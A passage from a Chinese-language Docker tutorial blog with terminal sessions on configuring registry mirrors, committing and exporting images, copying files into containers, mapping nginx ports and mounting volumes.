<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://registry.docker-cn.com&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以配置多个地址（不建议配多个，经我自测，配多个时下载速度很慢，远不如单个时快）：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line">                      ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-重新加载并重启docker"><a href="#2-重新加载并重启docker" class="headerlink" title="2.重新加载并重启docker"></a>2.重新加载并重启docker</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><strong>备注</strong></p>
<p>网上找的其他人的个人加速器地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://v2c6fjn8.mirror.aliyuncs.com</span><br><span class="line">https://almtd3fa.mirror.aliyuncs.com</span><br><span class="line">https://285n1qr6.mirror.aliyuncs.com</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://285n1qr6.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="commit制作镜像"><a href="#commit制作镜像" class="headerlink" title="commit制作镜像"></a>commit制作镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES</span><br><span class="line">3060f61c0aa7   tomcat                 <span class="string">&quot;catalina.sh run&quot;</span>        27 seconds ago   Up 26 seconds   8080/tcp, 0.0.0.0:3355-&gt;80/tcp, :::3355-&gt;80/tcp                                        qatomcat</span><br><span class="line">6efd902e5166   aoiawd-master_aoiawd   <span class="string">&quot;php ./aoiawd.phar -…&quot;</span>   7 months ago     Up 3 minutes    0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp, 0.0.0.0:8023-&gt;8023/tcp, :::8023-&gt;8023/tcp   aoiawd-master-aoiawd-1</span><br><span class="line">44bf3bc1e11f   mongo:latest           <span class="string">&quot;docker-entrypoint.s…&quot;</span>   7 months ago     Up 3 minutes    27017/tcp                                                                              aoiawd-master-mongodb-1</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker exec -it 3060f61c0aa7 /bin/bash</span></span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># ls</span></span><br><span class="line">BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs            temp     webapps.dist</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   native-jni-lib  webapps  work</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># cp webapps.dist/* webapps</span></span><br><span class="line"><span class="built_in">cp</span>: -r not specified; omitting directory <span class="string">&#x27;webapps.dist/ROOT&#x27;</span></span><br><span class="line"><span class="built_in">cp</span>: -r not specified; omitting directory <span class="string">&#x27;webapps.dist/docs&#x27;</span></span><br><span class="line"><span class="built_in">cp</span>: -r not specified; omitting directory <span class="string">&#x27;webapps.dist/examples&#x27;</span></span><br><span class="line"><span class="built_in">cp</span>: -r not specified; omitting directory <span class="string">&#x27;webapps.dist/host-manager&#x27;</span></span><br><span class="line"><span class="built_in">cp</span>: -r not specified; omitting directory <span class="string">&#x27;webapps.dist/manager&#x27;</span></span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># cp -r webapps.dist/* webapps/</span></span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># curl localhost</span></span><br><span class="line">curl: (7) Failed to connect to localhost port 80: Connection refused</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># curl localhost:80</span></span><br><span class="line">curl: (7) Failed to connect to localhost port 80: Connection refused</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># ls</span></span><br><span class="line">BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs            temp     webapps.dist</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   native-jni-lib  webapps  work</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat<span class="comment"># cd temp</span></span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># ls</span></span><br><span class="line">safeToDelete.tmp</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># cat qingandemo&gt;1.txt</span></span><br><span class="line"><span class="built_in">cat</span>: qingandemo: No such file or directory</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># cat &gt;1.txt</span></span><br><span class="line">qqing^H^H^H^H^H^H^H^Hdemoroot@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># ls</span></span><br><span class="line">1.txt  safeToDelete.tmp</span><br><span class="line">root@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># cat 1.txt</span></span><br><span class="line">demoroot@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># cat 1.txt</span></span><br><span class="line">demoroot@3060f61c0aa7:/usr/local/tomcat/temp<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker commit -a=&quot;qa&quot; -m=&quot;add webapps and temp/1.txt&quot; 3060f61c0aa7 qatomcat01:1.0</span></span><br><span class="line">sha256:5122068fb96a40bc51500eb673146232ac3098509cd09df59c4bcbe083e8a0dc</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker images                                                                    </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qatomcat01             1.0       5122068fb96a   6 seconds ago   684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   7 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   8 months ago    695MB</span><br><span class="line">tomcat                 latest    fb5657adc892   17 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   18 months ago   693MB</span><br></pre></td></tr></table></figure>

<p>启动新制作的docker镜像</p>
<p>注意在镜像名字后加上版本号，如果tag不是latest，会提示Unable to find image ‘镜像名:latest’ locally</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -p 3355:80 qatomcat01:1.0</span><br></pre></td></tr></table></figure>

<h2 id="镜像的导入导出"><a href="#镜像的导入导出" class="headerlink" title="镜像的导入导出"></a>镜像的导入导出</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker images                                             </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qatomcat01             1.0       5122068fb96a   6 weeks ago     684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   9 months ago    695MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   19 months ago   693MB</span><br><span class="line">                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker save qatomcat01 &gt; demoqa.tar</span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ls       </span></span><br><span class="line">demoqa.tar    </span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure>

<p>docker save 镜像名或者镜像id &gt; 镜像名.tar</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save 5122068fb96a &gt; demoqa.tar</span><br></pre></td></tr></table></figure>

<h3 id="镜像的导入"><a href="#镜像的导入" class="headerlink" title="镜像的导入"></a>镜像的导入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker images              </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   9 months ago    695MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   19 months ago   693MB</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker load -i /home/kali/demoqa.tar                                  </span></span><br><span class="line">Loaded image ID: sha256:5122068fb96a40bc51500eb673146232ac3098509cd09df59c4bcbe083e8a0dc</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker images                       </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">&lt;none&gt;                 &lt;none&gt;    5122068fb96a   6 weeks ago     684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   9 months ago    695MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   19 months ago   693MB</span><br></pre></td></tr></table></figure>

<p>导入方法二</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load &lt; /home/kali/demoqa.tar</span><br></pre></td></tr></table></figure>

<h3 id="镜像的删除"><a href="#镜像的删除" class="headerlink" title="镜像的删除"></a>镜像的删除</h3><p> docker rmi -f 镜像id</p>
<p>例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># docker images                                               </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qacentos               1.0       26463029dda4   2 minutes ago   231MB</span><br><span class="line">qa/centos              1.0       26463029dda4   2 minutes ago   231MB</span><br><span class="line">qingandemo             v1.01     5122068fb96a   8 weeks ago     684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   10 months ago   695MB</span><br><span class="line">nginx                  latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mysql                  latest    3218b38490ce   19 months ago   516MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   20 months ago   693MB</span><br><span class="line">centos                 latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># docker rmi -f 3218b38490ce </span></span><br><span class="line">Untagged: mysql:latest</span><br><span class="line">Untagged: mysql@sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709</span><br><span class="line">Deleted: sha256:3218b38490cec8d31976a40b92e09d61377359eab878db49f025e5d464367f3b</span><br></pre></td></tr></table></figure>

<h2 id="docker与主机的数据拷贝"><a href="#docker与主机的数据拷贝" class="headerlink" title="docker与主机的数据拷贝"></a>docker与主机的数据拷贝</h2><p>本地文件拷贝到容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker exec -it 363712da6083 /bin/bash</span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># ls</span></span><br><span class="line">BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs            qingchu.txt  webapps       work</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   native-jni-lib  temp         webapps.dist</span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># </span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># </span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># ls</span></span><br><span class="line">BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs            qingchu.txt  webapps       work</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   native-jni-lib  temp         webapps.dist</span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># exit </span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker cp  /home/kali/Desktop/Java反序列化漏洞利用工具V1.7.jar 363712da6083:/usr/local/tomcat</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># docker attach 363712da6083                                                                   </span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># ls</span></span><br><span class="line">BUILDING.txt     Java反序列化漏洞利用工具V1.7.jar  NOTICE     RELEASE-NOTES  bin   lib   native-jni-lib  temp     webapps.dist</span><br><span class="line">CONTRIBUTING.md  LICENSE                           README.md  RUNNING.txt    conf  logs  qingchu.txt     webapps  work</span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="将本机某一目录下所有文件拷贝到容器"><a href="#将本机某一目录下所有文件拷贝到容器" class="headerlink" title="将本机某一目录下所有文件拷贝到容器"></a>将本机某一目录下所有文件拷贝到容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> docker <span class="built_in">cp</span> . 363712da6083:/usr/local/tomcat/qa01</span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># mkdir qa01</span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># cd qa01/</span></span><br><span class="line">root@363712da6083:/usr/local/tomcat/qa01<span class="comment"># ls</span></span><br><span class="line">root@363712da6083:/usr/local/tomcat/qa01<span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker cp . 363712da6083:/usr/local/tomcat/qa01</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker exec -it 363712da6083 /bin/bash         </span></span><br><span class="line">root@363712da6083:/usr/local/tomcat<span class="comment"># cd qa01/</span></span><br><span class="line">root@363712da6083:/usr/local/tomcat/qa01<span class="comment"># ls -al</span></span><br><span class="line">total 14448</span><br><span class="line">drwxr-xr-x 2 root root     4096 Jul 24 05:12 .</span><br><span class="line">drwxr-xr-x 1 root root     4096 Jul 24 05:11 ..</span><br><span class="line">-rwxrwxrwx 1 1000 1000  4041325 May 16 13:18 frp_0.29.0_linux_amd64.zip</span><br><span class="line">-rwxrwxrwx 1 1000 1000 10733408 Aug 29  2019 frpc</span><br><span class="line">-rwxrwxrwx 1 1000 1000      181 Jun 20 11:17 frpc.ini</span><br><span class="line">-rwxrwxrwx 1 1000 1000      986 May 19 14:35 j1.txt</span><br><span class="line">root@363712da6083:/usr/local/tomcat/qa01<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>将容器文件拷贝到主机本地</p>
<p> docker cp 容器di:容器的文件路径 主机本地的文件路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 363712da6083:/usr/local/tomcat/BUILDING.txt  /home/kali/Desktop/mhfrp </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker cp 363712da6083:/usr/local/tomcat/BUILDING.txt  /home/kali/Desktop/mhfrp </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">总计 14468</span><br><span class="line">drwxrwxrwx  2 kali kali     4096  7月24日 01:16 .</span><br><span class="line">drwxrwxrwx 31 kali kali     4096  6月20日 07:21 ..</span><br><span class="line">-rw-r--r--  1 root root    18994 2021年12月 2日 BUILDING.txt</span><br><span class="line">-rwxrwxrwx  1 kali kali  4041325  5月16日 09:18 frp_0.29.0_linux_amd64.zip</span><br><span class="line">-rwxrwxrwx  1 kali kali 10733408 2019年 8月29日 frpc</span><br><span class="line">-rwxrwxrwx  1 kali kali      181  6月20日 07:17 frpc.ini</span><br><span class="line">-rwxrwxrwx  1 kali kali      986  5月19日 10:35 j1.txt</span><br></pre></td></tr></table></figure>

<h2 id="docker部署nginx-映射端口"><a href="#docker部署nginx-映射端口" class="headerlink" title="docker部署nginx 映射端口"></a>docker部署nginx 映射端口</h2><p>nginx镜像新建启动时不要在后面用 &#x2F;bin&#x2F;bash</p>
<p>Docker run -p 本地端口:容器端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -ti -d --name mynginx01 -p 8081:80 605c77e624dd</span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker images                                                                  </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qingandemo             v1.01     5122068fb96a   6 weeks ago     684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   9 months ago    695MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   19 months ago   693MB</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker pull nginx</span></span><br><span class="line">Using default tag: latest</span><br><span class="line"></span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">a2abf6c4d29d: Pull complete </span><br><span class="line">a9edb18cadd1: Pull complete </span><br><span class="line">589b7251471a: Pull complete </span><br><span class="line">186b1aaa4aa6: Pull complete </span><br><span class="line">b4df32aa5a72: Pull complete </span><br><span class="line">a0bcbecc962e: Pull complete </span><br><span class="line">Digest: sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> nginx:latest</span><br><span class="line">docker.io/library/nginx:latest</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker images    </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qingandemo             v1.01     5122068fb96a   6 weeks ago     684MB</span><br><span class="line">aoiawd-master_aoiawd   latest    26f017ffc942   9 months ago    434MB</span><br><span class="line">mongo                  &lt;none&gt;    1cca5cf68239   9 months ago    695MB</span><br><span class="line">nginx                  latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">tomcat                 latest    fb5657adc892   19 months ago   680MB</span><br><span class="line">mongo                  latest    dfda7a2cf273   19 months ago   693MB</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker run -ti -d --name mynginx 605c77e624dd </span></span><br><span class="line">f1dfab777acf3f88e4f55b860efcbdb0ba08fc064b9989558e81cf19a5d67d4b</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker ps                                    </span></span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES</span><br><span class="line">f1dfab777acf   605c77e624dd           <span class="string">&quot;/docker-entrypoint.…&quot;</span>   10 seconds ago   Up 10 seconds   80/tcp                                                                                 mynginx</span><br><span class="line">363712da6083   fb5657adc892           <span class="string">&quot;/bin/bash&quot;</span>              41 hours ago     Up 11 minutes   8080/tcp                                                                               mytc</span><br><span class="line">6efd902e5166   aoiawd-master_aoiawd   <span class="string">&quot;php ./aoiawd.phar -…&quot;</span>   9 months ago     Up 57 minutes   0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp, 0.0.0.0:8023-&gt;8023/tcp, :::8023-&gt;8023/tcp   aoiawd-master-aoiawd-1</span><br><span class="line">44bf3bc1e11f   mongo:latest           <span class="string">&quot;docker-entrypoint.s…&quot;</span>   9 months ago     Up 57 minutes   27017/tcp                                                                              aoiawd-master-mongodb-1</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker exec -it f1dfab777acf /bin/bash</span></span><br><span class="line">root@f1dfab777acf:/<span class="comment"># ls</span></span><br><span class="line">bin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">root@f1dfab777acf:/<span class="comment"># curl 127.0.0.1</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you <span class="keyword">for</span> using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker run -ti -d --name mynginx01 -p 8081:80 605c77e624dd</span></span><br><span class="line">a07232eba6670cd672c0a6e3458cd44bb514496c7e4a2ca7acaa6e3d259acb86</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># docker ps -a                                              </span></span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS                     PORTS                                                                                  NAMES</span><br><span class="line">a07232eba667   605c77e624dd           <span class="string">&quot;/docker-entrypoint.…&quot;</span>   9 seconds ago   Up 8 seconds               0.0.0.0:8081-&gt;80/tcp, :::8081-&gt;80/tcp                                                  mynginx01</span><br><span class="line">f1dfab777acf   605c77e624dd           <span class="string">&quot;/docker-entrypoint.…&quot;</span>   7 minutes ago   Up 7 minutes               80/tcp                                                                                 mynginx</span><br><span class="line">363712da6083   fb5657adc892           <span class="string">&quot;/bin/bash&quot;</span>              42 hours ago    Up 19 minutes              8080/tcp                                                                               mytc</span><br><span class="line">b5dab47a5674   5122068fb96a           <span class="string">&quot;/bin/bash&quot;</span>              6 weeks ago     Exited (255) 6 weeks ago   80/tcp, 8080/tcp                                                                       romantic_bassi</span><br><span class="line">6efd902e5166   aoiawd-master_aoiawd   <span class="string">&quot;php ./aoiawd.phar -…&quot;</span>   9 months ago    Up About an hour           0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp, 0.0.0.0:8023-&gt;8023/tcp, :::8023-&gt;8023/tcp   aoiawd-master-aoiawd-1</span><br><span class="line">44bf3bc1e11f   mongo:latest           <span class="string">&quot;docker-entrypoint.s…&quot;</span>   9 months ago    Up About an hour           27017/tcp                                                                              aoiawd-master-mongodb-1</span><br><span class="line">                                                                                                                                                            </span><br><span class="line"></span><br><span class="line">──(root㉿kali)-[/home/kali/Desktop/mhfrp]</span><br><span class="line">└─<span class="comment"># curl 192.168.31.162:8081 </span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you <span class="keyword">for</span> using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="查看docker-ip等配置"><a href="#查看docker-ip等配置" class="headerlink" title="查看docker ip等配置"></a>查看docker ip等配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect a07232eba667 </span><br><span class="line">docker inspect a07232eba667 | grep IPAddress</span><br></pre></td></tr></table></figure>

<p>docker安装vim</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y vim</span><br></pre></td></tr></table></figure>

<h2 id="指定目录挂载数据卷"><a href="#指定目录挂载数据卷" class="headerlink" title="指定目录挂载数据卷"></a>指定目录挂载数据卷</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -ti -d --name n03 -p 83:80 -v /home/kali/Downloads/:/usr/share/nginx/html 605c77e624dd</span><br></pre></td></tr></table></figure>

<h2 id="匿名挂载Nginx容器"><a href="#匿名挂载Nginx容器" class="headerlink" title="匿名挂载Nginx容器"></a>匿名挂载Nginx容器</h2><p><strong>匿名挂载就是在指定数据卷的时候，不指定容器路径对应的主机路径，这样对应映射的主机路径就是默认的路径&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;中自动生成一个随机命名的文件夹。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 容器挂载</span></span><br><span class="line">-v 容器内路径！！</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line"></span><br><span class="line">[root@VM-16-15-centos /]<span class="comment"># docker run -d -P --name nginx02 -v /etc/nginx nginx</span></span><br><span class="line">fc8882b1c63eeab2747c1f73de277cd17ec6adce03f3858ae80f987a89d78ffb</span><br></pre></td></tr></table></figure>

<p><strong>查看所有的volume的情况</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-16-15-centos /]<span class="comment"># docker volume ls</span></span><br><span class="line">DRIVER    VOLUME NAME</span><br><span class="line"><span class="built_in">local</span>     6d6823cbffcdc5309333df94acf6646c8e3b49998b17b9da58fd74694ce0b061</span><br><span class="line"><span class="built_in">local</span>     c393f55a28b9e8cd929cc57479c11a48290d74892ed481bc208cb8e881c1d7be</span><br><span class="line"></span><br><span class="line"><span class="comment">#  这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径！</span></span><br></pre></td></tr></table></figure>

<h3 id="2-具名挂载"><a href="#2-具名挂载" class="headerlink" title="2.具名挂载"></a>2.具名挂载</h3><p><strong>具名挂载，就是指定文件夹名称</strong>。 将容器内的路径挂载时指定它的名字</p>
